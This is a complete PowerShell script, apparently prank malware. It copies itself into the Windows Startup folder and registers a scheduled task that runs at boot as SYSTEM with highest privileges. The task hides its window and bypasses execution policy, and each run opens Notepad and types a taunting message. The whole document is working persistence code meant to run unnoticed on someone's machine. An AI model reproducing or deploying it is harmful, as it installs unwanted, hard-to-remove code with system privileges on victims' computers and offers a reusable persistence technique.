# Define Paths
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$selfPath = $MyInvocation.MyCommand.Path
$scriptDestination = "$startupPath\BootScript.ps1"
$notepadScriptPath = "$startupPath\NotepadMessage.ps1"

# Copy itself to the Startup folder for persistence
Copy-Item -Path $selfPath -Destination $scriptDestination -Force

# Create the Notepad Message Script
$notepadScriptContent = @'
# Start Notepad in hidden mode
$notepad = Start-Process -PassThru notepad
Start-Sleep -Seconds 1  # Give Notepad time to open

# Activate Notepad
$wshell = New-Object -ComObject WScript.Shell
$wshell.AppActivate($notepad.Id)
Start-Sleep -Seconds 1  # Allow activation time

# Send "Hello again Old Friend" and clear any default text
$wshell.SendKeys("^a")  # Select all text
Start-Sleep -Milliseconds 500  # Small delay to ensure selection
$wshell.SendKeys("{DEL}")  # Delete any pre-existing content
Start-Sleep -Milliseconds 500  # Small delay before input
$wshell.SendKeys("Hello again Old Friend")  # Input desired text
$wshell.SendKeys("{ENTER}")
$wshell.SendKeys("            Hello again Old Friend") 
$wshell.SendKeys("{ENTER}")
$wshell.SendKeys("Hello again Old Friend") 
$wshell.SendKeys("{ENTER}")
$wshell.SendKeys("Give me a call you stupid Fool!!!!") 
'@


# Write the Notepad script to a file
$notepadScriptContent | Set-Content -Path $notepadScriptPath -Encoding UTF8

# Create a Scheduled Task for Persistence as SYSTEM
$taskName = "PersistentBootScript"
$taskDescription = "Ensures Notepad message runs at system boot as SYSTEM."
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$notepadScriptPath`""
$taskTrigger = New-ScheduledTaskTrigger -AtStartup
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -RunOnlyIfNetworkAvailable
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $taskName -Description $taskDescription -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Principal $principal -Force

# Run the Notepad script immediately, hidden
# Start-Process -WindowStyle Hidden powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$notepadScriptPath`""
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$notepadScriptPath`""

